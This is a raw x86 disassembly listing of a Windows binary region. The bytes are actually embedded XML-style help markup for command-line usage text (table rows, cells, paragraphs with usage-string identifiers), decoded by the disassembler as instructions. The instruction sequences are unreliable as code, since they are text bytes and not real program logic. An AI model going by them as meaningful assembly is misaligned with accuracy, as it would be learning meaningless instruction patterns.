1100c2c8:	ds or  eax,0x2020200a
1100c2ce:	and    BYTE PTR [eax],ah
1100c2d0:	and    BYTE PTR [eax],ah
1100c2d2:	and    BYTE PTR [eax],ah
1100c2d4:	and    BYTE PTR [eax+edx*2],bh
1100c2d7:	popa   
1100c2d8:	jb     0x1100c33b
1100c2da:	addr16 jb 0x1100c33e
1100c2dd:	jo     0x1100c347
1100c2df:	ds inc ebx
1100c2e1:	dec    esp
1100c2e2:	dec    ecx
1100c2e3:	pop    edi
1100c2e4:	push   ebp
1100c2e5:	push   ebx
1100c2e6:	inc    ecx
1100c2e7:	inc    edi
1100c2e8:	inc    ebp
1100c2e9:	pop    edi
1100c2ea:	dec    esp
1100c2eb:	dec    ecx
1100c2ec:	dec    esi
1100c2ed:	dec    ebx
1100c2ee:	pop    edi
1100c2ef:	dec    edi
1100c2f0:	push   eax
1100c2f1:	push   esp
1100c2f2:	dec    ecx
1100c2f3:	dec    edi
1100c2f4:	dec    esi
1100c2f5:	pop    edi
1100c2f6:	inc    esp
1100c2f7:	inc    ebp
1100c2f8:	push   ebx
1100c2f9:	inc    ebx
1100c2fa:	cmp    al,0x2f
1100c2fc:	push   eax
1100c2fd:	popa   
1100c2fe:	jb     0x1100c361
1100c300:	addr16 jb 0x1100c364
1100c303:	jo     0x1100c36d
1100c305:	ds or  eax,0x2020200a
1100c30b:	and    BYTE PTR [eax],ah
1100c30d:	and    BYTE PTR [eax],ah
1100c30f:	and    BYTE PTR [edi+ebp*1],bh
1100c312:	push   esp
1100c313:	popa   
1100c314:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c318:	gs ins BYTE PTR es:[edi],dx
1100c31a:	ins    BYTE PTR es:[edi],dx
1100c31b:	ds or  eax,0x2020200a
1100c321:	and    BYTE PTR [eax],ah
1100c323:	and    BYTE PTR [edi+ebp*1],bh
1100c326:	push   esp
1100c327:	popa   
1100c328:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c32c:	outs   dx,DWORD PTR ds:[esi]
1100c32d:	ja     0x1100c36d
1100c32f:	or     eax,0x200a0d0a
1100c334:	and    BYTE PTR [eax],ah
1100c336:	and    BYTE PTR [eax],ah
1100c338:	and    BYTE PTR [esp+edx*2],bh
1100c33b:	popa   
1100c33c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c340:	outs   dx,DWORD PTR ds:[esi]
1100c341:	ja     0x1100c381
1100c343:	or     eax,0x2020200a
1100c348:	and    BYTE PTR [eax],ah
1100c34a:	and    BYTE PTR [eax],ah
1100c34c:	and    BYTE PTR [esp+edx*2],bh
1100c34f:	popa   
1100c350:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c354:	gs ins BYTE PTR es:[edi],dx
1100c356:	ins    BYTE PTR es:[edi],dx
1100c357:	and    BYTE PTR [ebx+0x6f],al
1100c35a:	ins    BYTE PTR es:[edi],dx
1100c35b:	jne    0x1100c3ca
1100c35d:	outs   dx,BYTE PTR ds:[esi]
1100c35e:	push   ebx
1100c35f:	jo     0x1100c3c2
1100c361:	outs   dx,BYTE PTR ds:[esi]
1100c362:	cmp    eax,0x3e223222
1100c367:	or     eax,0x2020200a
1100c36c:	and    BYTE PTR [eax],ah
1100c36e:	and    BYTE PTR [eax],ah
1100c370:	and    BYTE PTR [edi+ebp*1],bh
1100c373:	push   esp
1100c374:	popa   
1100c375:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c379:	gs ins BYTE PTR es:[edi],dx
1100c37b:	ins    BYTE PTR es:[edi],dx
1100c37c:	ds or  eax,0x2020200a
1100c382:	and    BYTE PTR [eax],ah
1100c384:	and    BYTE PTR [edi+ebp*1],bh
1100c387:	push   esp
1100c388:	popa   
1100c389:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c38d:	outs   dx,DWORD PTR ds:[esi]
1100c38e:	ja     0x1100c3ce
1100c390:	or     eax,0x2020200a
1100c395:	and    BYTE PTR [edi+ebp*1],bh
1100c398:	push   esp
1100c399:	popa   
1100c39a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c39e:	outs   dx,DWORD PTR ds:[esi]
1100c39f:	ja     0x1100c3e8
1100c3a1:	jb     0x1100c412
1100c3a3:	jne    0x1100c415
1100c3a5:	ds or  eax,0x200a0d0a
1100c3ab:	and    BYTE PTR [eax],ah
1100c3ad:	and    BYTE PTR [esp+edx*2],bh
1100c3b0:	popa   
1100c3b1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c3b5:	outs   dx,DWORD PTR ds:[esi]
1100c3b6:	ja     0x1100c3ff
1100c3b8:	jb     0x1100c429
1100c3ba:	jne    0x1100c42c
1100c3bc:	and    BYTE PTR [ebx+0x74],dl
1100c3bf:	jns    0x1100c42d
1100c3c1:	gs cmp eax,0x74537b22
1100c3c7:	popa   
1100c3c8:	je     0x1100c433
1100c3ca:	arpl   WORD PTR [edx+0x65],dx
1100c3cd:	jae    0x1100c43e
1100c3cf:	jne    0x1100c443
1100c3d1:	arpl   WORD PTR [ebp+0x20],sp
1100c3d4:	push   0x65646165
1100c3d9:	jb     0x1100c421
1100c3db:	outs   dx,DWORD PTR ds:[esi]
1100c3dc:	outs   dx,DWORD PTR ds:[esi]
1100c3dd:	je     0x1100c444
1100c3df:	jb     0x1100c433
1100c3e1:	outs   dx,DWORD PTR ds:[esi]
1100c3e2:	ja     0x1100c437
1100c3e4:	je     0x1100c45f
1100c3e6:	ins    BYTE PTR es:[edi],dx
1100c3e7:	gs jge 0x1100c40c
1100c3ea:	ds or  eax,0x2020200a
1100c3f0:	and    BYTE PTR [eax],ah
1100c3f2:	and    BYTE PTR [esp+edx*2],bh
1100c3f5:	popa   
1100c3f6:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c3fa:	outs   dx,DWORD PTR ds:[esi]
1100c3fb:	ja     0x1100c43b
1100c3fd:	or     eax,0x2020200a
1100c402:	and    BYTE PTR [eax],ah
1100c404:	and    BYTE PTR [eax],ah
1100c406:	and    BYTE PTR [esp+edx*2],bh
1100c409:	popa   
1100c40a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c40e:	gs ins BYTE PTR es:[edi],dx
1100c410:	ins    BYTE PTR es:[edi],dx
1100c411:	and    BYTE PTR [ebx+0x6f],al
1100c414:	ins    BYTE PTR es:[edi],dx
1100c415:	jne    0x1100c484
1100c417:	outs   dx,BYTE PTR ds:[esi]
1100c418:	push   ebx
1100c419:	jo     0x1100c47c
1100c41b:	outs   dx,BYTE PTR ds:[esi]
1100c41c:	cmp    eax,0x3e223222
1100c421:	or     eax,0x2020200a
1100c426:	and    BYTE PTR [eax],ah
1100c428:	and    BYTE PTR [eax],ah
1100c42a:	and    BYTE PTR [eax],ah
1100c42c:	and    BYTE PTR [eax+edx*2],bh
1100c42f:	popa   
1100c430:	jb     0x1100c493
1100c432:	addr16 jb 0x1100c496
1100c435:	jo     0x1100c49f
1100c437:	ds inc ebx
1100c439:	dec    esp
1100c43a:	dec    ecx
1100c43b:	pop    edi
1100c43c:	push   ebp
1100c43d:	push   ebx
1100c43e:	inc    ecx
1100c43f:	inc    edi
1100c440:	inc    ebp
1100c441:	pop    edi
1100c442:	inc    ebp
1100c443:	pop    eax
1100c444:	push   esp
1100c445:	pop    edi
1100c446:	push   eax
1100c447:	push   edx
1100c448:	inc    ebp
1100c449:	dec    ebp
1100c44a:	inc    ecx
1100c44b:	push   edx
1100c44c:	dec    ebx
1100c44d:	pop    edi
1100c44e:	dec    edi
1100c44f:	push   eax
1100c450:	push   esp
1100c451:	dec    ecx
1100c452:	dec    edi
1100c453:	dec    esi
1100c454:	push   ebx
1100c455:	cmp    al,0x2f
1100c457:	push   eax
1100c458:	popa   
1100c459:	jb     0x1100c4bc
1100c45b:	addr16 jb 0x1100c4bf
1100c45e:	jo     0x1100c4c8
1100c460:	ds or  eax,0x2020200a
1100c466:	and    BYTE PTR [eax],ah
1100c468:	and    BYTE PTR [eax],ah
1100c46a:	and    BYTE PTR [edi+ebp*1],bh
1100c46d:	push   esp
1100c46e:	popa   
1100c46f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c473:	gs ins BYTE PTR es:[edi],dx
1100c475:	ins    BYTE PTR es:[edi],dx
1100c476:	ds or  eax,0x2020200a
1100c47c:	and    BYTE PTR [eax],ah
1100c47e:	and    BYTE PTR [edi+ebp*1],bh
1100c481:	push   esp
1100c482:	popa   
1100c483:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c487:	outs   dx,DWORD PTR ds:[esi]
1100c488:	ja     0x1100c4c8
1100c48a:	or     eax,0x2020200a
1100c48f:	and    BYTE PTR [edi+ebp*1],bh
1100c492:	push   esp
1100c493:	popa   
1100c494:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c498:	outs   dx,DWORD PTR ds:[esi]
1100c499:	ja     0x1100c4e2
1100c49b:	jb     0x1100c50c
1100c49d:	jne    0x1100c50f
1100c49f:	ds or  eax,0x200a0d0a
1100c4a5:	and    BYTE PTR [eax],ah
1100c4a7:	and    BYTE PTR [esp+edx*2],bh
1100c4aa:	popa   
1100c4ab:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c4af:	outs   dx,DWORD PTR ds:[esi]
1100c4b0:	ja     0x1100c4f9
1100c4b2:	jb     0x1100c523
1100c4b4:	jne    0x1100c526
1100c4b6:	and    BYTE PTR [ebx+0x74],dl
1100c4b9:	jns    0x1100c527
1100c4bb:	gs cmp eax,0x74537b22
1100c4c1:	popa   
1100c4c2:	je     0x1100c52d
1100c4c4:	arpl   WORD PTR [edx+0x65],dx
1100c4c7:	jae    0x1100c538
1100c4c9:	jne    0x1100c53d
1100c4cb:	arpl   WORD PTR [ebp+0x20],sp
1100c4ce:	fs popa 
1100c4d0:	je     0x1100c533
1100c4d2:	push   edx
1100c4d3:	outs   dx,DWORD PTR ds:[esi]
1100c4d4:	ja     0x1100c529
1100c4d6:	je     0x1100c551
1100c4d8:	ins    BYTE PTR es:[edi],dx
1100c4d9:	gs jge 0x1100c4fe
1100c4dc:	ds or  eax,0x2020200a
1100c4e2:	and    BYTE PTR [eax],ah
1100c4e4:	and    BYTE PTR [esp+edx*2],bh
1100c4e7:	popa   
1100c4e8:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c4ec:	outs   dx,DWORD PTR ds:[esi]
1100c4ed:	ja     0x1100c52d
1100c4ef:	or     eax,0x2020200a
1100c4f4:	and    BYTE PTR [eax],ah
1100c4f6:	and    BYTE PTR [eax],ah
1100c4f8:	and    BYTE PTR [esp+edx*2],bh
1100c4fb:	popa   
1100c4fc:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c500:	gs ins BYTE PTR es:[edi],dx
1100c502:	ins    BYTE PTR es:[edi],dx
1100c503:	ds or  eax,0x2020200a
1100c509:	and    BYTE PTR [eax],ah
1100c50b:	and    BYTE PTR [eax],ah
1100c50d:	and    BYTE PTR [eax],ah
1100c50f:	and    BYTE PTR [eax+edx*2],bh
1100c512:	popa   
1100c513:	jb     0x1100c576
1100c515:	addr16 jb 0x1100c579
1100c518:	jo     0x1100c582
1100c51a:	and    BYTE PTR [esi+0x6f],al
1100c51d:	jb     0x1100c584
1100c51f:	addr16 jb 0x1100c591
1100c522:	jne    0x1100c592
1100c524:	fs cmp eax,0x756c4222
1100c52a:	and    bh,BYTE PTR gs:[esi]
1100c52d:	inc    ebx
1100c52e:	dec    esp
1100c52f:	dec    ecx
1100c530:	pop    edi
1100c531:	push   ebp
1100c532:	push   ebx
1100c533:	inc    ecx
1100c534:	inc    edi
1100c535:	inc    ebp
1100c536:	pop    edi
1100c537:	push   eax
1100c538:	push   edx
1100c539:	inc    ebp
1100c53a:	dec    ebp
1100c53b:	inc    ecx
1100c53c:	push   edx
1100c53d:	dec    ebx
1100c53e:	pop    edi
1100c53f:	dec    edi
1100c540:	push   eax
1100c541:	push   esp
1100c542:	dec    ecx
1100c543:	dec    edi
1100c544:	dec    esi
1100c545:	cmp    al,0x2f
1100c547:	push   eax
1100c548:	popa   
1100c549:	jb     0x1100c5ac
1100c54b:	addr16 jb 0x1100c5af
1100c54e:	jo     0x1100c5b8
1100c550:	ds or  eax,0x2020200a
1100c556:	and    BYTE PTR [eax],ah
1100c558:	and    BYTE PTR [eax],ah
1100c55a:	and    BYTE PTR [edi+ebp*1],bh
1100c55d:	push   esp
1100c55e:	popa   
1100c55f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c563:	gs ins BYTE PTR es:[edi],dx
1100c565:	ins    BYTE PTR es:[edi],dx
1100c566:	ds or  eax,0x2020200a
1100c56c:	and    BYTE PTR [eax],ah
1100c56e:	and    BYTE PTR [eax],ah
1100c570:	and    BYTE PTR [esp+edx*2],bh
1100c573:	popa   
1100c574:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c578:	gs ins BYTE PTR es:[edi],dx
1100c57a:	ins    BYTE PTR es:[edi],dx
1100c57b:	ds or  eax,0x2020200a
1100c581:	and    BYTE PTR [eax],ah
1100c583:	and    BYTE PTR [eax],ah
1100c585:	and    BYTE PTR [eax],ah
1100c587:	and    BYTE PTR [eax+edx*2],bh
1100c58a:	popa   
1100c58b:	jb     0x1100c5ee
1100c58d:	addr16 jb 0x1100c5f1
1100c590:	jo     0x1100c5fa
1100c592:	ds inc ebx
1100c594:	dec    esp
1100c595:	dec    ecx
1100c596:	pop    edi
1100c597:	push   ebp
1100c598:	push   ebx
1100c599:	inc    ecx
1100c59a:	inc    edi
1100c59b:	inc    ebp
1100c59c:	pop    edi
1100c59d:	push   eax
1100c59e:	push   edx
1100c59f:	inc    ebp
1100c5a0:	dec    ebp
1100c5a1:	inc    ecx
1100c5a2:	push   edx
1100c5a3:	dec    ebx
1100c5a4:	pop    edi
1100c5a5:	dec    edi
1100c5a6:	push   eax
1100c5a7:	push   esp
1100c5a8:	dec    ecx
1100c5a9:	dec    edi
1100c5aa:	dec    esi
1100c5ab:	pop    edi
1100c5ac:	inc    esp
1100c5ad:	inc    ebp
1100c5ae:	push   ebx
1100c5af:	inc    ebx
1100c5b0:	cmp    al,0x2f
1100c5b2:	push   eax
1100c5b3:	popa   
1100c5b4:	jb     0x1100c617
1100c5b6:	addr16 jb 0x1100c61a
1100c5b9:	jo     0x1100c623
1100c5bb:	ds or  eax,0x2020200a
1100c5c1:	and    BYTE PTR [eax],ah
1100c5c3:	and    BYTE PTR [eax],ah
1100c5c5:	and    BYTE PTR [edi+ebp*1],bh
1100c5c8:	push   esp
1100c5c9:	popa   
1100c5ca:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c5ce:	gs ins BYTE PTR es:[edi],dx
1100c5d0:	ins    BYTE PTR es:[edi],dx
1100c5d1:	ds or  eax,0x2020200a
1100c5d7:	and    BYTE PTR [eax],ah
1100c5d9:	and    BYTE PTR [edi+ebp*1],bh
1100c5dc:	push   esp
1100c5dd:	popa   
1100c5de:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c5e2:	outs   dx,DWORD PTR ds:[esi]
1100c5e3:	ja     0x1100c623
1100c5e5:	or     eax,0x200a0d0a
1100c5ea:	and    BYTE PTR [eax],ah
1100c5ec:	and    BYTE PTR [eax],ah
1100c5ee:	and    BYTE PTR [esp+edx*2],bh
1100c5f1:	popa   
1100c5f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c5f6:	outs   dx,DWORD PTR ds:[esi]
1100c5f7:	ja     0x1100c637
1100c5f9:	or     eax,0x2020200a
1100c5fe:	and    BYTE PTR [eax],ah
1100c600:	and    BYTE PTR [eax],ah
1100c602:	and    BYTE PTR [esp+edx*2],bh
1100c605:	popa   
1100c606:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c60a:	gs ins BYTE PTR es:[edi],dx
1100c60c:	ins    BYTE PTR es:[edi],dx
1100c60d:	ds or  eax,0x2020200a
1100c613:	and    BYTE PTR [eax],ah
1100c615:	and    BYTE PTR [eax],ah
1100c617:	and    BYTE PTR [eax],ah
1100c619:	and    BYTE PTR [eax+edx*2],bh
1100c61c:	popa   
1100c61d:	jb     0x1100c680
1100c61f:	addr16 jb 0x1100c683
1100c622:	jo     0x1100c68c
1100c624:	and    BYTE PTR [esi+0x6f],al
1100c627:	jb     0x1100c68e
1100c629:	addr16 jb 0x1100c69b
1100c62c:	jne    0x1100c69c
1100c62e:	fs cmp eax,0x756c4222
1100c634:	and    bh,BYTE PTR gs:[esi]
1100c637:	inc    ebx
1100c638:	dec    esp
1100c639:	dec    ecx
1100c63a:	pop    edi
1100c63b:	push   ebp
1100c63c:	push   ebx
1100c63d:	inc    ecx
1100c63e:	inc    edi
1100c63f:	inc    ebp
1100c640:	pop    edi
1100c641:	push   eax
1100c642:	push   edx
1100c643:	inc    ebp
1100c644:	dec    ebp
1100c645:	inc    ecx
1100c646:	push   edx
1100c647:	dec    ebx
1100c648:	push   ebx
1100c649:	push   esp
1100c64a:	push   edx
1100c64b:	dec    ecx
1100c64c:	dec    esi
1100c64d:	inc    edi
1100c64e:	pop    edi
1100c64f:	dec    edi
1100c650:	push   eax
1100c651:	push   esp
1100c652:	dec    ecx
1100c653:	dec    edi
1100c654:	dec    esi
1100c655:	cmp    al,0x2f
1100c657:	push   eax
1100c658:	popa   
1100c659:	jb     0x1100c6bc
1100c65b:	addr16 jb 0x1100c6bf
1100c65e:	jo     0x1100c6c8
1100c660:	ds or  eax,0x2020200a
1100c666:	and    BYTE PTR [eax],ah
1100c668:	and    BYTE PTR [eax],ah
1100c66a:	and    BYTE PTR [edi+ebp*1],bh
1100c66d:	push   esp
1100c66e:	popa   
1100c66f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c673:	gs ins BYTE PTR es:[edi],dx
1100c675:	ins    BYTE PTR es:[edi],dx
1100c676:	ds or  eax,0x2020200a
1100c67c:	and    BYTE PTR [eax],ah
1100c67e:	and    BYTE PTR [eax],ah
1100c680:	and    BYTE PTR [esp+edx*2],bh
1100c683:	popa   
1100c684:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c688:	gs ins BYTE PTR es:[edi],dx
1100c68a:	ins    BYTE PTR es:[edi],dx
1100c68b:	ds or  eax,0x2020200a
1100c691:	and    BYTE PTR [eax],ah
1100c693:	and    BYTE PTR [eax],ah
1100c695:	and    BYTE PTR [eax],ah
1100c697:	and    BYTE PTR [eax+edx*2],bh
1100c69a:	popa   
1100c69b:	jb     0x1100c6fe
1100c69d:	addr16 jb 0x1100c701
1100c6a0:	jo     0x1100c70a
1100c6a2:	ds inc ebx
1100c6a4:	dec    esp
1100c6a5:	dec    ecx
1100c6a6:	pop    edi
1100c6a7:	push   ebp
1100c6a8:	push   ebx
1100c6a9:	inc    ecx
1100c6aa:	inc    edi
1100c6ab:	inc    ebp
1100c6ac:	pop    edi
1100c6ad:	push   eax
1100c6ae:	push   edx
1100c6af:	inc    ebp
1100c6b0:	dec    ebp
1100c6b1:	inc    ecx
1100c6b2:	push   edx
1100c6b3:	dec    ebx
1100c6b4:	push   ebx
1100c6b5:	push   esp
1100c6b6:	push   edx
1100c6b7:	dec    ecx
1100c6b8:	dec    esi
1100c6b9:	inc    edi
1100c6ba:	pop    edi
1100c6bb:	dec    edi
1100c6bc:	push   eax
1100c6bd:	push   esp
1100c6be:	dec    ecx
1100c6bf:	dec    edi
1100c6c0:	dec    esi
1100c6c1:	pop    edi
1100c6c2:	inc    esp
1100c6c3:	inc    ebp
1100c6c4:	push   ebx
1100c6c5:	inc    ebx
1100c6c6:	cmp    al,0x2f
1100c6c8:	push   eax
1100c6c9:	popa   
1100c6ca:	jb     0x1100c72d
1100c6cc:	addr16 jb 0x1100c730
1100c6cf:	jo     0x1100c739
1100c6d1:	ds or  eax,0x2020200a
1100c6d7:	and    BYTE PTR [eax],ah
1100c6d9:	and    BYTE PTR [eax],ah
1100c6db:	and    BYTE PTR [edi+ebp*1],bh
1100c6de:	push   esp
1100c6df:	popa   
1100c6e0:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c6e4:	gs ins BYTE PTR es:[edi],dx
1100c6e6:	ins    BYTE PTR es:[edi],dx
1100c6e7:	ds or  eax,0x2020200a
1100c6ed:	and    BYTE PTR [eax],ah
1100c6ef:	and    BYTE PTR [edi+ebp*1],bh
1100c6f2:	push   esp
1100c6f3:	popa   
1100c6f4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c6f8:	outs   dx,DWORD PTR ds:[esi]
1100c6f9:	ja     0x1100c739
1100c6fb:	or     eax,0x200a0d0a
1100c700:	and    BYTE PTR [eax],ah
1100c702:	and    BYTE PTR [eax],ah
1100c704:	and    BYTE PTR [esp+edx*2],bh
1100c707:	popa   
1100c708:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c70c:	outs   dx,DWORD PTR ds:[esi]
1100c70d:	ja     0x1100c74d
1100c70f:	or     eax,0x2020200a
1100c714:	and    BYTE PTR [eax],ah
1100c716:	and    BYTE PTR [eax],ah
1100c718:	and    BYTE PTR [esp+edx*2],bh
1100c71b:	popa   
1100c71c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c720:	gs ins BYTE PTR es:[edi],dx
1100c722:	ins    BYTE PTR es:[edi],dx
1100c723:	ds or  eax,0x2020200a
1100c729:	and    BYTE PTR [eax],ah
1100c72b:	and    BYTE PTR [eax],ah
1100c72d:	and    BYTE PTR [eax],ah
1100c72f:	and    BYTE PTR [eax+edx*2],bh
1100c732:	popa   
1100c733:	jb     0x1100c796
1100c735:	addr16 jb 0x1100c799
1100c738:	jo     0x1100c7a2
1100c73a:	and    BYTE PTR [esi+0x6f],al
1100c73d:	jb     0x1100c7a4
1100c73f:	addr16 jb 0x1100c7b1
1100c742:	jne    0x1100c7b2
1100c744:	fs cmp eax,0x756c4222
1100c74a:	and    bh,BYTE PTR gs:[esi]
1100c74d:	inc    ebx
1100c74e:	dec    esp
1100c74f:	dec    ecx
1100c750:	pop    edi
1100c751:	push   ebp
1100c752:	push   ebx
1100c753:	inc    ecx
1100c754:	inc    edi
1100c755:	inc    ebp
1100c756:	pop    edi
1100c757:	push   eax
1100c758:	push   edx
1100c759:	inc    ebp
1100c75a:	dec    ebp
1100c75b:	inc    ecx
1100c75c:	push   edx
1100c75d:	dec    ebx
1100c75e:	push   eax
1100c75f:	inc    ecx
1100c760:	push   ebx
1100c761:	push   ebx
1100c762:	pop    edi
1100c763:	dec    edi
1100c764:	push   eax
1100c765:	push   esp
1100c766:	dec    ecx
1100c767:	dec    edi
1100c768:	dec    esi
1100c769:	cmp    al,0x2f
1100c76b:	push   eax
1100c76c:	popa   
1100c76d:	jb     0x1100c7d0
1100c76f:	addr16 jb 0x1100c7d3
1100c772:	jo     0x1100c7dc
1100c774:	ds or  eax,0x2020200a
1100c77a:	and    BYTE PTR [eax],ah
1100c77c:	and    BYTE PTR [eax],ah
1100c77e:	and    BYTE PTR [edi+ebp*1],bh
1100c781:	push   esp
1100c782:	popa   
1100c783:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c787:	gs ins BYTE PTR es:[edi],dx
1100c789:	ins    BYTE PTR es:[edi],dx
1100c78a:	ds or  eax,0x2020200a
1100c790:	and    BYTE PTR [eax],ah
1100c792:	and    BYTE PTR [eax],ah
1100c794:	and    BYTE PTR [esp+edx*2],bh
1100c797:	popa   
1100c798:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c79c:	gs ins BYTE PTR es:[edi],dx
1100c79e:	ins    BYTE PTR es:[edi],dx
1100c79f:	ds or  eax,0x2020200a
1100c7a5:	and    BYTE PTR [eax],ah
1100c7a7:	and    BYTE PTR [eax],ah
1100c7a9:	and    BYTE PTR [eax],ah
1100c7ab:	and    BYTE PTR [eax+edx*2],bh
1100c7ae:	popa   
1100c7af:	jb     0x1100c812
1100c7b1:	addr16 jb 0x1100c815
1100c7b4:	jo     0x1100c81e
1100c7b6:	ds inc ebx
1100c7b8:	dec    esp
1100c7b9:	dec    ecx
1100c7ba:	pop    edi
1100c7bb:	push   ebp
1100c7bc:	push   ebx
1100c7bd:	inc    ecx
1100c7be:	inc    edi
1100c7bf:	inc    ebp
1100c7c0:	pop    edi
1100c7c1:	push   eax
1100c7c2:	push   edx
1100c7c3:	inc    ebp
1100c7c4:	dec    ebp
1100c7c5:	inc    ecx
1100c7c6:	push   edx
1100c7c7:	dec    ebx
1100c7c8:	push   eax
1100c7c9:	inc    ecx
1100c7ca:	push   ebx
1100c7cb:	push   ebx
1100c7cc:	pop    edi
1100c7cd:	dec    edi
1100c7ce:	push   eax
1100c7cf:	push   esp
1100c7d0:	dec    ecx
1100c7d1:	dec    edi
1100c7d2:	dec    esi
1100c7d3:	pop    edi
1100c7d4:	inc    esp
1100c7d5:	inc    ebp
1100c7d6:	push   ebx
1100c7d7:	inc    ebx
1100c7d8:	cmp    al,0x2f
1100c7da:	push   eax
1100c7db:	popa   
1100c7dc:	jb     0x1100c83f
1100c7de:	addr16 jb 0x1100c842
1100c7e1:	jo     0x1100c84b
1100c7e3:	ds or  eax,0x2020200a
1100c7e9:	and    BYTE PTR [eax],ah
1100c7eb:	and    BYTE PTR [eax],ah
1100c7ed:	and    BYTE PTR [edi+ebp*1],bh
1100c7f0:	push   esp
1100c7f1:	popa   
1100c7f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c7f6:	gs ins BYTE PTR es:[edi],dx
1100c7f8:	ins    BYTE PTR es:[edi],dx
1100c7f9:	ds or  eax,0x2020200a
1100c7ff:	and    BYTE PTR [eax],ah
1100c801:	and    BYTE PTR [edi+ebp*1],bh
1100c804:	push   esp
1100c805:	popa   
1100c806:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c80a:	outs   dx,DWORD PTR ds:[esi]
1100c80b:	ja     0x1100c84b
1100c80d:	or     eax,0x200a0d0a
1100c812:	and    BYTE PTR [eax],ah
1100c814:	and    BYTE PTR [eax],ah
1100c816:	and    BYTE PTR [esp+edx*2],bh
1100c819:	popa   
1100c81a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x52]
1100c81e:	outs   dx,DWORD PTR ds:[esi]
1100c81f:	ja     0x1100c85f
1100c821:	or     eax,0x2020200a
1100c826:	and    BYTE PTR [eax],ah
1100c828:	and    BYTE PTR [eax],ah
1100c82a:	and    BYTE PTR [esp+edx*2],bh
1100c82d:	popa   
1100c82e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c832:	gs ins BYTE PTR es:[edi],dx
1100c834:	ins    BYTE PTR es:[edi],dx
1100c835:	ds or  eax,0x2020200a
1100c83b:	and    BYTE PTR [eax],ah
1100c83d:	and    BYTE PTR [eax],ah
1100c83f:	and    BYTE PTR [eax],ah
1100c841:	and    BYTE PTR [eax+edx*2],bh
1100c844:	popa   
1100c845:	jb     0x1100c8a8
1100c847:	addr16 jb 0x1100c8ab
1100c84a:	jo     0x1100c8b4
1100c84c:	and    BYTE PTR [esi+0x6f],al
1100c84f:	jb     0x1100c8b6
1100c851:	addr16 jb 0x1100c8c3
1100c854:	jne    0x1100c8c4
1100c856:	fs cmp eax,0x756c4222
1100c85c:	and    bh,BYTE PTR gs:[esi]
1100c85f:	inc    ebx
1100c860:	dec    esp
1100c861:	dec    ecx
1100c862:	pop    edi
1100c863:	push   ebp
1100c864:	push   ebx
1100c865:	inc    ecx
1100c866:	inc    edi
1100c867:	inc    ebp
1100c868:	pop    edi
1100c869:	push   eax
1100c86a:	push   edx
1100c86b:	inc    ebp
1100c86c:	dec    ebp
1100c86d:	inc    ecx
1100c86e:	push   edx
1100c86f:	dec    ebx
1100c870:	inc    ebx
1100c871:	dec    eax
1100c872:	inc    ecx
1100c873:	push   edx
1100c874:	dec    ebp
1100c875:	inc    ecx
1100c876:	push   eax
1100c877:	pop    edi
1100c878:	dec    edi
1100c879:	push   eax
1100c87a:	push   esp
1100c87b:	dec    ecx
1100c87c:	dec    edi
1100c87d:	dec    esi
1100c87e:	cmp    al,0x2f
1100c880:	push   eax
1100c881:	popa   
1100c882:	jb     0x1100c8e5
1100c884:	addr16 jb 0x1100c8e8
1100c887:	jo     0x1100c8f1
1100c889:	ds or  eax,0x2020200a
1100c88f:	and    BYTE PTR [eax],ah
1100c891:	and    BYTE PTR [eax],ah
1100c893:	and    BYTE PTR [edi+ebp*1],bh
1100c896:	push   esp
1100c897:	popa   
1100c898:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c89c:	gs ins BYTE PTR es:[edi],dx
1100c89e:	ins    BYTE PTR es:[edi],dx
1100c89f:	ds or  eax,0x2020200a
1100c8a5:	and    BYTE PTR [eax],ah
1100c8a7:	and    BYTE PTR [eax],ah
1100c8a9:	and    BYTE PTR [esp+edx*2],bh
1100c8ac:	popa   
1100c8ad:	bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
1100c8b1:	gs ins BYTE PTR es:[edi],dx
1100c8b3:	ins    BYTE PTR es:[edi],dx
1100c8b4:	ds or  eax,0x2020200a
1100c8ba:	and    BYTE PTR [eax],ah
1100c8bc:	and    BYTE PTR [eax],ah
1100c8be:	and    BYTE PTR [eax],ah
1100c8c0:	and    BYTE PTR [eax+edx*2],bh
1100c8c3:	popa   
1100c8c4:	jb     0x1100c927
1100c8c6:	addr16 jb 0x1100c92a
1100c8c9:	jo     0x1100c933
1100c8cb:	ds inc ebx
1100c8cd:	dec    esp
1100c8ce:	dec    ecx
1100c8cf:	pop    edi
1100c8d0:	push   ebp
1100c8d1:	push   ebx
1100c8d2:	inc    ecx
1100c8d3:	inc    edi
